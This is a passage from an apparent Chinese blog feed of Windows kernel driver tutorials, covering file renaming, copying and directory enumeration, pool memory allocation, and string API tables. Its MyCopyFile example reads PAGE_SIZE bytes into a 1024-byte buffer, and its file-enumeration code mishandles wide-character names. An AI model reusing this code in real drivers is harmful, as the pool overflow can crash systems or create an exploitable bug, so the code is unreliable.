&amp;oa,</span><br><span class="line">		&amp;IoStatus,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		FILE_SHARE_READ, </span><br><span class="line">		FILE_OPEN,</span><br><span class="line">		FILE_SYNCHRONOUS_IO_NONALERT | FILE_NO_INTERMEDIATE_BUFFERING,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"打开文件失败%x\n"</span>, status));</span><br><span class="line">		ExFreePool(RenameInfo);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	KdPrint((<span class="string">"打开文件成功\n"</span>));</span><br><span class="line">	status = ZwSetInformationFile(</span><br><span class="line">		hFile,</span><br><span class="line">		&amp;IoStatus,</span><br><span class="line">		RenameInfo,</span><br><span class="line">		ulLength,</span><br><span class="line">		FileRenameInformation);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"设置文件/文件夹信息失败%x\n"</span>, status));</span><br><span class="line">		ExFreePool(RenameInfo);</span><br><span class="line">		ZwClose(hFile);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	KdPrint((<span class="string">"文件/文件夹重命名成功\n"</span>));</span><br><span class="line">	<span class="comment">// 关闭文件句柄</span></span><br><span class="line">	ZwClose(hFile);</span><br><span class="line">	ExFreePool(RenameInfo);</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="拷贝文件"><a href="#拷贝文件" class="headerlink" title="拷贝文件"></a>拷贝文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="comment">// Method:    MyCopyFile</span></span><br><span class="line"><span class="comment">// FullName:  MyCopyFile</span></span><br><span class="line"><span class="comment">// Access:    public </span></span><br><span class="line"><span class="comment">// Returns:   NTSTATUS</span></span><br><span class="line"><span class="comment">// Qualifier: 将源文件拷贝到目标路径</span></span><br><span class="line"><span class="comment">// Parameter: UNICODE_STRING SrcFilePath 源文件路径</span></span><br><span class="line"><span class="comment">// Parameter: UNICODE_STRING DestFilePath 要拷贝到的目标文件路径</span></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyCopyFile</span><span class="params">(IN UNICODE_STRING SrcFilePath, IN UNICODE_STRING DestFilePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 返回值</span></span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	<span class="comment">// 源文件句柄</span></span><br><span class="line">	HANDLE hSrcFile = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 目的文件句柄</span></span><br><span class="line">	HANDLE hDestFile = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 初始化源文件结构</span></span><br><span class="line">	OBJECT_ATTRIBUTES Srcoa = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	IO_STATUS_BLOCK IoStatus = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// 初始化目标文件OBJECT_ATTRIBUTES结构</span></span><br><span class="line">	OBJECT_ATTRIBUTES Destcoa = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// 用来存放写入数据的buffer</span></span><br><span class="line">	PVOID pFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 要写入数据的长度</span></span><br><span class="line">	ULONG length = <span class="number">0</span>;</span><br><span class="line">	LARGE_INTEGER offset = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	InitializeObjectAttributes(&amp;Srcoa, &amp;SrcFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	InitializeObjectAttributes(&amp;Destcoa, &amp;DestFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// 打开源文件</span></span><br><span class="line">	status = ZwOpenFile(</span><br><span class="line">		&amp;hSrcFile,</span><br><span class="line">		GENERIC_ALL,</span><br><span class="line">		&amp;Srcoa,</span><br><span class="line">		&amp;IoStatus,</span><br><span class="line">		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,</span><br><span class="line">		FILE_SYNCHRONOUS_IO_NONALERT);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"文件打开失败%x\n"</span>, status));</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 创建目标文件</span></span><br><span class="line">	status = ZwCreateFile(</span><br><span class="line">		&amp;hDestFile,</span><br><span class="line">		GENERIC_ALL,</span><br><span class="line">		&amp;Destcoa,</span><br><span class="line">		&amp;IoStatus,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,</span><br><span class="line">		FILE_OPEN_IF,</span><br><span class="line">		FILE_SYNCHRONOUS_IO_NONALERT,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		ZwClose(hSrcFile);</span><br><span class="line">		KdPrint((<span class="string">"创建目标文件失败%x\n"</span>, status));</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 申请堆空间用来存放要写入的数据</span></span><br><span class="line">	pFileBuffer = ExAllocatePool(PagedPool, <span class="number">1024</span>);</span><br><span class="line">	<span class="keyword">if</span> (pFileBuffer == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		ZwClose(hSrcFile);</span><br><span class="line">		ZwClose(hDestFile);</span><br><span class="line">		KdPrint((<span class="string">"堆空间申请失败\n"</span>));</span><br><span class="line">		<span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 从源文件中读取数据</span></span><br><span class="line">		status = ZwReadFile(</span><br><span class="line">			hSrcFile,</span><br><span class="line">			<span class="literal">NULL</span>,</span><br><span class="line">			<span class="literal">NULL</span>,</span><br><span class="line">			<span class="literal">NULL</span>,</span><br><span class="line">			&amp;IoStatus,</span><br><span class="line">			pFileBuffer,</span><br><span class="line">			PAGE_SIZE,</span><br><span class="line">			&amp;offset,</span><br><span class="line">			<span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 如果status返回值为STATUS_END_OF_FILE</span></span><br><span class="line">			<span class="comment">// 说明已经读取到了文件末尾</span></span><br><span class="line">			<span class="keyword">if</span> (status == STATUS_END_OF_FILE)</span><br><span class="line">			&#123;</span><br><span class="line">				status = STATUS_SUCCESS;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 读取文件完成跳出循环</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 需要写入数据的实际长度</span></span><br><span class="line">		length = (ULONG)IoStatus.Information;</span><br><span class="line">		<span class="comment">// 将源文件内容写入到目标文件中</span></span><br><span class="line">		status = ZwWriteFile(</span><br><span class="line">			hDestFile,</span><br><span class="line">			<span class="literal">NULL</span>,</span><br><span class="line">			<span class="literal">NULL</span>,</span><br><span class="line">			<span class="literal">NULL</span>,</span><br><span class="line">			&amp;IoStatus,</span><br><span class="line">			pFileBuffer,</span><br><span class="line">			length,</span><br><span class="line">			&amp;offset,</span><br><span class="line">			<span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">		&#123;</span><br><span class="line">			KdPrint((<span class="string">"写入文件失败%x\n"</span>, status));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 移动文件指针</span></span><br><span class="line">		offset.QuadPart += length;</span><br><span class="line">	&#125;</span><br><span class="line">	ZwClose(hSrcFile);</span><br><span class="line">	ZwClose(hDestFile);</span><br><span class="line">	ExFreePool(pFileBuffer);</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="遍历文件"><a href="#遍历文件" class="headerlink" title="遍历文件"></a>遍历文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="comment">// Method:    MyFindFirstFile</span></span><br><span class="line"><span class="comment">// FullName:  MyFindFirstFile</span></span><br><span class="line"><span class="comment">// Access:    public </span></span><br><span class="line"><span class="comment">// Returns:   BOOLEAN</span></span><br><span class="line"><span class="comment">// Qualifier:</span></span><br><span class="line"><span class="comment">// Parameter: IN HANDLE hFile 文件句柄</span></span><br><span class="line"><span class="comment">// Parameter: IN ULONG ulLength 文件信息长度</span></span><br><span class="line"><span class="comment">// Parameter: OUT PFILE_BOTH_DIR_INFORMATION pDir 文件信息结构</span></span><br><span class="line"><span class="comment">// Parameter: IN ULONG ulFirstLength 文件信息长度</span></span><br><span class="line"><span class="comment">// Parameter: OUT PFILE_BOTH_DIR_INFORMATION pFirstDir	第一个文件信息结构</span></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">MyFindFirstFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	IN HANDLE hFile, </span></span></span><br><span class="line"><span class="function"><span class="params">	IN ULONG ulLength,</span></span></span><br><span class="line"><span class="function"><span class="params">	OUT PFILE_BOTH_DIR_INFORMATION pDir,</span></span></span><br><span class="line"><span class="function"><span class="params">	IN ULONG ulFirstLength, </span></span></span><br><span class="line"><span class="function"><span class="params">	OUT PFILE_BOTH_DIR_INFORMATION pFirstDir</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 返回值</span></span><br><span class="line">	NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">	IO_STATUS_BLOCK IoStatus = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	status = ZwQueryDirectoryFile(</span><br><span class="line">		hFile,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		&amp;IoStatus,</span><br><span class="line">		pFirstDir,</span><br><span class="line">		ulFirstLength,</span><br><span class="line">		FileBothDirectoryInformation,</span><br><span class="line">		TRUE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		FALSE);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"查询文件目录失败%x\n"</span>,status));</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	status = ZwQueryDirectoryFile(</span><br><span class="line">		hFile,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		&amp;IoStatus,</span><br><span class="line">		pDir,</span><br><span class="line">		ulLength,</span><br><span class="line">		FileBothDirectoryInformation,</span><br><span class="line">		FALSE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		FALSE);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="comment">// Method:    MyFindNextFile</span></span><br><span class="line"><span class="comment">// FullName:  MyFindNextFile</span></span><br><span class="line"><span class="comment">// Access:    public </span></span><br><span class="line"><span class="comment">// Returns:   BOOLEAN</span></span><br><span class="line"><span class="comment">// Qualifier:</span></span><br><span class="line"><span class="comment">// Parameter: IN PFILE_BOTH_DIR_INFORMATION pDirList 文件信息结构</span></span><br><span class="line"><span class="comment">// Parameter: OUT PFILE_BOTH_DIR_INFORMATION pDirInfo 文件信息结构</span></span><br><span class="line"><span class="comment">// Parameter: IN OUT LONG * lEntryOffset 文件信息结构偏移</span></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">MyFindNextFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	IN PFILE_BOTH_DIR_INFORMATION pDirList, </span></span></span><br><span class="line"><span class="function"><span class="params">	OUT PFILE_BOTH_DIR_INFORMATION pDirInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">	IN OUT LONG * lEntryOffset</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 如果有下一项，则移动指针指向下一项</span></span><br><span class="line">	PFILE_BOTH_DIR_INFORMATION pDir = (PFILE_BOTH_DIR_INFORMATION)((PCHAR)pDirList + *lEntryOffset);</span><br><span class="line">	LONG StructLenth = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 判断如果FileName[0]不等于0和0xff说明已经没有下一个文件了</span></span><br><span class="line">	<span class="keyword">if</span> (pDir-&gt;FileName[<span class="number">0</span>] != <span class="number">0</span> &amp;&amp; pDir-&gt;FileName[<span class="number">0</span>] != <span class="number">0xff</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		StructLenth = <span class="keyword">sizeof</span>(FILE_BOTH_DIR_INFORMATION);</span><br><span class="line">		<span class="comment">// 拷贝下一项文件信息到pDirInfo</span></span><br><span class="line">		<span class="built_in">memcpy</span>(pDirInfo, pDir, StructLenth + pDir-&gt;FileNameLength);</span><br><span class="line">		<span class="comment">// 加上下一个文件信息偏移</span></span><br><span class="line">		*lEntryOffset = *lEntryOffset + pDir-&gt;NextEntryOffset;</span><br><span class="line">		<span class="comment">// 如果NextEntryOffset为0说明已经没有下一项了</span></span><br><span class="line">		<span class="keyword">if</span> (pDir-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			*lEntryOffset = *lEntryOffset + StructLenth + pDir-&gt;FileNameLength;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="comment">// Method:    EnumFile</span></span><br><span class="line"><span class="comment">// FullName:  EnumFile</span></span><br><span class="line"><span class="comment">// Access:    public </span></span><br><span class="line"><span class="comment">// Returns:   NTSTATUS</span></span><br><span class="line"><span class="comment">// Qualifier: 给定文件目录进行遍历</span></span><br><span class="line"><span class="comment">// Parameter: UNICODE_STRING FilePaht 要遍历的目录</span></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">EnumFile</span><span class="params">(IN UNICODE_STRING FilePaht)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 返回值</span></span><br><span class="line">	NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">	<span class="comment">// 文件句柄</span></span><br><span class="line">	HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG nFileInfoSize = <span class="keyword">sizeof</span>(FILE_BOTH_DIR_INFORMATION) + <span class="number">270</span> * <span class="keyword">sizeof</span>(WCHAR);</span><br><span class="line">	ULONG nSize = nFileInfoSize * <span class="number">0x300</span>;</span><br><span class="line">	<span class="keyword">char</span> strFileName[<span class="number">0x300</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PFILE_BOTH_DIR_INFORMATION pFileTemp = <span class="literal">NULL</span>;</span><br><span class="line">	PFILE_BOTH_DIR_INFORMATION pFileList = <span class="literal">NULL</span>;</span><br><span class="line">	pFileList = (PFILE_BOTH_DIR_INFORMATION)ExAllocatePool(PagedPool, nSize);</span><br><span class="line">	pFileTemp = (PFILE_BOTH_DIR_INFORMATION)ExAllocatePool(PagedPool, nFileInfoSize);</span><br><span class="line">	OBJECT_ATTRIBUTES oa = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	IO_STATUS_BLOCK IoStatus = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	InitializeObjectAttributes(&amp;oa, &amp;FilePaht, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	status = ZwOpenFile(</span><br><span class="line">		&amp;hFile,</span><br><span class="line">		GENERIC_ALL,</span><br><span class="line">		&amp;oa,</span><br><span class="line">		&amp;IoStatus,</span><br><span class="line">		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,</span><br><span class="line">		FILE_SYNCHRONOUS_IO_NONALERT);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"文件打开失败%x\n"</span>, status));</span><br><span class="line">		ExFreePool(pFileList);</span><br><span class="line">		ExFreePool(pFileTemp);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (MyFindFirstFile(hFile, nSize, pFileList, nFileInfoSize, pFileTemp))</span><br><span class="line">	&#123;</span><br><span class="line">		LONG lEntryOffset = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">do</span> </span><br><span class="line">		&#123;</span><br><span class="line">			RtlZeroMemory(strFileName, <span class="number">0x256</span>);</span><br><span class="line">			RtlCopyMemory(strFileName, pFileTemp-&gt;FileName, pFileTemp-&gt;FileNameLength);</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strcmp</span>(strFileName, <span class="string">"."</span>) != <span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(strFileName, <span class="string">".."</span>) != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (pFileTemp-&gt;FileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">				&#123;</span><br><span class="line">					KdPrint((<span class="string">"[目录]%S\n"</span>, strFileName));</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					KdPrint((<span class="string">"[文件]%S\n"</span>, strFileName));</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">memset</span>(pFileTemp, <span class="number">0</span>, nFileInfoSize);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (MyFindNextFile(pFileList,pFileTemp,&amp;lEntryOffset));</span><br><span class="line">	&#125;</span><br><span class="line">	ZwClose(hFile);</span><br><span class="line">	ExFreePool(pFileList);</span><br><span class="line">	ExFreePool(pFileTemp);</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>]]></content>
      <categories>
        <category>Windows驱动开发</category>
      </categories>
      <tags>
        <tag>WindowsDriver</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows内核编程之内存管理</title>
    <url>/Windows_Kernel_Memory_Manage.html</url>
    <content><![CDATA[<h2 id="内存管理部分API"><a href="#内存管理部分API" class="headerlink" title="内存管理部分API"></a>内存管理部分API</h2><table>
<thead>
<tr>
<th style="text-align:center">函数功能</th>
<th style="text-align:center">内核版</th>
<th style="text-align:center">应用版</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">申请内存</td>
<td style="text-align:center">ExAllocatePool<br>ExAllocatePoolWithTag</td>
<td style="text-align:center">malloc</td>
</tr>
<tr>
<td style="text-align:center">释放内存</td>
<td style="text-align:center">ExFreePool<br>ExFreePoolWithTag</td>
<td style="text-align:center">free</td>
</tr>
<tr>
<td style="text-align:center">拷贝内存</td>
<td style="text-align:center">RtlCopyMemory</td>
<td style="text-align:center">memcpy</td>
</tr>
<tr>
<td style="text-align:center">填充内存</td>
<td style="text-align:center">RtlFillMemory</td>
<td style="text-align:center">memset</td>
</tr>
<tr>
<td style="text-align:center">移动内存</td>
<td style="text-align:center">RtlMoveMemory</td>
<td style="text-align:center">memmove</td>
</tr>
<tr>
<td style="text-align:center">清空内存</td>
<td style="text-align:center">RtlZeroMemory</td>
</tr>
</tbody>
</table>
<a id="more"></a>
<h2 id="部分函数代码示例"><a href="#部分函数代码示例" class="headerlink" title="部分函数代码示例"></a>部分函数代码示例</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 申请1024字节分页内存，分页内存指当当前可用物理内存不足时这片内存可以被交换到硬盘上的内存</span></span><br><span class="line"><span class="comment">// 当要用到这块被交换到硬盘上的分页内存系统则触发分页异常之后系统会将在硬盘上的内存再次放到物理内存中</span></span><br><span class="line"><span class="comment">// 申请非分页内存NonPagedPool代表无论物理内存怎么紧缺这块内存永远不会被交换到硬盘上</span></span><br><span class="line">PVOID pstr1 = ExAllocatePool(PagedPool, <span class="number">1024</span>);</span><br><span class="line"><span class="keyword">if</span> (pstr1 == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((<span class="string">"内存分配失败\n"</span>));</span><br><span class="line">	<span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">&#125;</span><br><span class="line">KdPrint((<span class="string">"内存分配成功\n"</span>));</span><br><span class="line"><span class="comment">// 将1024字节内存全部填充为0xcc</span></span><br><span class="line">RtlFillMemory(pstr1, <span class="number">1024</span>, <span class="number">0xcc</span>);</span><br><span class="line"><span class="comment">// 内存拷贝</span></span><br><span class="line">RtlCopyMemory(pstr1, <span class="string">"内存拷贝测试"</span>, <span class="built_in">strlen</span>(<span class="string">"内存拷贝测试"</span>));</span><br><span class="line"><span class="comment">// 猜一下打印出来的内容</span></span><br><span class="line">KdPrint((<span class="string">"%s\n"</span>, pstr1));</span><br><span class="line"><span class="comment">// 将内存清0</span></span><br><span class="line">RtlZeroMemory(pstr1, <span class="number">1024</span>);</span><br><span class="line"><span class="comment">// RtlMoveMemory可以保证拷贝两个有重叠区域的内存保证拷贝的正确性</span></span><br><span class="line"><span class="comment">// RtlCopyMemory就不保证这了，不过RtlCopyMemory拷贝速度较快</span></span><br><span class="line">RtlMoveMemory(pstr1,<span class="string">"这是内存管理测试内容"</span>,<span class="number">22</span> );</span><br><span class="line">KdPrint((<span class="string">"%s\n"</span>, pstr1));</span><br><span class="line"><span class="comment">// 释放内存</span></span><br><span class="line">ExFreePool(pstr1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请1024字节带Tag的非分页内存，Tag的内容为单引号分隔的最多四个字符的字符文字</span></span><br><span class="line"><span class="comment">// 标记中的每个ASCII字符必须是0x20（空格）到0x7E（波浪号）范围内的值</span></span><br><span class="line"><span class="comment">// Tag用来检测内存泄漏</span></span><br><span class="line">PVOID pstr2 = ExAllocatePoolWithTag(NonPagedPool, 1024, 'abcd');</span><br><span class="line"><span class="keyword">if</span> (pstr2 == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((<span class="string">"带Tag的内存分配失败\n"</span>));</span><br><span class="line">	<span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">&#125;</span><br><span class="line">KdPrint((<span class="string">"Tag内存分配成功\n"</span>));</span><br><span class="line"><span class="comment">// 释放带Tag的内存</span></span><br><span class="line">ExFreePoolWithTag(pstr2, 'abcd');</span><br></pre></td></tr></table></figure>
<hr>]]></content>
      <categories>
        <category>Windows驱动开发</category>
      </categories>
      <tags>
        <tag>WindowsDriver</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows内核编程之字符串操作</title>
    <url>/Windows_Kernel_String_Operations.html</url>
    <content><![CDATA[<h2 id="ANSI字符串"><a href="#ANSI字符串" class="headerlink" title="ANSI字符串"></a>ANSI字符串</h2><table>
<thead>
<tr>
<th style="text-align:center">函数功能</th>
<th style="text-align:center">内核版</th>
<th style="text-align:center">应用版</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">字符串长度</td>
<td style="text-align:center">RtlStringCbLengthA<br>RtlStringCchLengthA</td>
<td style="text-align:center">strlen</td>
</tr>
<tr>
<td style="text-align:center">字符串拼接</td>
<td style="text-align:center">RtlStringCbCatA<br>RtlStringCbCatExA<br>RtlStringCchCatA<br>RtlStringCchCatExA</td>
<td style="text-align:center">strcat</td>
</tr>
<tr>
<td style="text-align:center">指定数目字符串拼接</td>
<td style="text-align:center">RtlStringCbCatNA<br>RtlStringCbCatNExA<br>RtlStringCchCatNA<br>RtlStringCchCatNExA</td>
<td style="text-align:center">strncat</td>
</tr>
<tr>
<td style="text-align:center">字符串拷贝</td>
<td style="text-align:center">RtlCopyString<br>RtlStringCbCopyA<br>RtlStringCbCopyExA<br>RtlStringCchCopyA<br>RtlStringCchCopyExA</td>
<td style="text-align:center">strcpy</td>
</tr>
<tr>
<td style="text-align:center">指定数目字符串拷贝</td>
<td style="text-align:center">RtlStringCbCopyNA<br>RtlStringCbCopyNExA<br>RtlStringCchCopyNA<br>RtlStringCchCopyNExA</td>
<td style="text-align:center">strncpy</td>
</tr>
<tr>
<td style="text-align:center">字符串比较</td>
<td style="text-align:center">RtlCompareString<br>RtlEqualString</td>
<td style="text-align:center">strcmp<br>strncmp<br>_stricmp<br>_strnicmp</td>
</tr>
<tr>
<td style="text-align:center">字符串初始化</td>
<td style="text-align:center">RtlInitString<br>RtlInitAnsiString</td>
<td style="text-align:center">_strset<br>_strnset</td>
</tr>
<tr>
<td style="text-align:center">字符串大小写</td>
<td style="text-align:center">RtlUpperString</td>
<td style="text-align:center">_strlwr<br>_strupr</td>
</tr>
<tr>
<td style="text-align:center">字符大小写</td>
<td style="text-align:center">RtlUpperChar</td>
<td style="text-align:center">isdigit<br>islower<br>isprint<br>isspace<br>isupper<br>isxdigit<br>tolower<br>toupper</td>
</tr>
<tr>
<td style="text-align:center">字符串格式化</td>
<td style="text-align:center">RtlStringCbPrintfA<br>RtlStringCbPrintfExA<br>RtlStringCchPrintfA<br>RtlStringCchPrintfExA</td>
<td style="text-align:center">sprintf<br>_snprintf</td>
</tr>
<tr>
<td style="text-align:center">可变字符串格式化</td>
<td style="text-align:center">RtlStringCbVPrintfA<br>RtlStringCbVPrintfExA<br>RtlStringCchVPrintfA<br>RtlStringCchVPrintfExA</td>
<td style="text-align:center">vsprintf<br>_vsnprintf</td>
</tr>
<tr>
<td style="text-align:center">字符串转数字</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">A版转W版</td>
<td style="text-align:center">RtlAnsiStringToUnicodeSize<br>RtlAnsiStringToUnicodeString</td>
<td style="text-align:center">atoi<br>atol<br>_itoa</td>
</tr>
<tr>
<td style="text-align:center">字符串逆转</td>
<td style="text-align:center"></td>
<td style="text-align:center">_strrev</td>
</tr>
<tr>
<td style="text-align:center">字符串内存释放</td>
<td style="text-align:center">RtlFreeAnsiString</td>
</tr>
</tbody>
</table>
<a id="more"></a>
<h2 id="Unicode字符串"><a href="#Unicode字符串" class="headerlink" title="Unicode字符串"></a>Unicode字符串</h2><table>
<thead>
<tr>
<th style="text-align:center">函数功能</th>
<th style="text-align:center">内核版</th>
<th style="text-align:center">应用版</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">字符串长度</td>
<td style="text-align:center">RtlStringCbLengthW<br>RtlStringCchLengthW</td>
<td style="text-align:center">wcslen</td>
</tr>
<tr>
<td style="text-align:center">字符串拼接</td>
<td style="text-align:center">RtlAppendUnicodeToString<br>RtlAppendUnicodeStringToString<br>RtlStringCbCatW<br>RtlStringCbCatExW<br>RtlStringCchCatW<br>RtlStringCchCatExW</td>
<td style="text-align:center">wcscat</td>
</tr>
<tr>
<td style="text-align:center">指定数目字符串拼接</td>
<td style="text-align:center">RtlStringCbCatNW<br>RtlStringCbCatNExW<br>RtlStringCchCatNW<br>RtlStringCchCatNExW</td>
<td style="text-align:center">wcsncat</td>
</tr>
<tr>
<td style="text-align:center">字符串拷贝</td>
<td style="text-align:center">RtlCopyUnicodeString<br>RtlStringCbCopyW<br>RtlStringCbCopyExW<br>RtlStringCchCopyW<br>RtlStringCchCopyExW</td>
<td style="text-align:center">wcscpy</td>
</tr>
<tr>
<td style="text-align:center">指定数目字符串拷贝</td>
<td style="text-align:center">RtlStringCbCopyNW<br>RtlStringCbCopyNExW<br>RtlStringCchCopyNW<br>RtlStringCchCopyNExW</td>
<td style="text-align:center">wcsncpy</td>
</tr>
<tr>
<td style="text-align:center">字符串比较</td>
<td style="text-align:center">RtlCompareUnicodeString<br>RtlEqualUnicodeString<br>RtlPrefixUnicodeString</td>
<td style="text-align:center">wcscmp<br>_wcsicmp</td>
</tr>
<tr>
<td style="text-align:center">字符串初始化</td>
<td style="text-align:center">RtlInitUnicodeString</td>
